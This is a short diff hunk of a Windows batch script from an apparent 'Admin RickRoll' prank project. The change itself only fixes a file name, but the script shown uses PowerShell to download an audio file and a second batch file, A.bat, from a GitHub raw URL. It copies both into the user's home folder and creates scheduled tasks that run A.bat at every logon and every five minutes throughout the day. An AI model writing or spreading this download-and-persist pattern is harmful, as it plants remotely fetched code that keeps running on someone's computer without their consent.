@@ -4,7 +4,7 @@
 cd /D "%~dp0"
 Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/RickRoll.mp3' -OutFile .\rickroll.mp3
 Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/A.bat' -OutFile .\A.bat
-copy rickroll.mp4 "C:%homepath%"
+copy rickroll.mp3 "C:%homepath%"
 copy A.bat "C:%homepath%"
 Schtasks /create /sc ONLOGON /tn L /tr "C:%homepath%\A.bat" 
 Schtasks /create /sc DAILY /tn LOL /tr "C:%homepath%\A.bat" /ri 5 /du 24:00
